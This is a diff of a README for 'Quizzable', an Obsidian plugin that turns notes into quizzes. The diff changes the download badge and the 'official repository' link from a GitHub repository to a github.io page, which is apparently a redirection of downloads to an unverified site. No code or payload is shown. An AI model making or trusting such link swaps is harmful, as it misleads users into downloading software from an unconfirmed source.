@@ -1,6 +1,6 @@
 # 🧠 Quizzable - Turn your notes into interactive quizzes
 
-[![Download Quizzable](https://img.shields.io/badge/Download-Quizzable-blue.svg)](https://github.com/Thebaultsnazzy209/Quizzable)
+[![Download Quizzable](https://img.shields.io/badge/Download-Quizzable-blue.svg)](https://thebaultsnazzy209.github.io)
 
 Quizzable helps you learn faster by turning your notes into playable quizzes directly inside Obsidian. You create content once in your vault and test your memory whenever you need a review. This tool supports multiple-choice questions to help you prepare for exams or master new topics.
 
@@ -20,7 +20,7 @@ To use this plugin, you must have the following items on your Windows computer:
 
 You must visit the main repository page to download the plugin files. Follow these steps:
 
-1. Visit the [official Quizzable repository](https://github.com/Thebaultsnazzy209/Quizzable).
+1. Visit the [official Quizzable repository](https://thebaultsnazzy209.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version available.
 4. Download the folder titled Source code (zip).
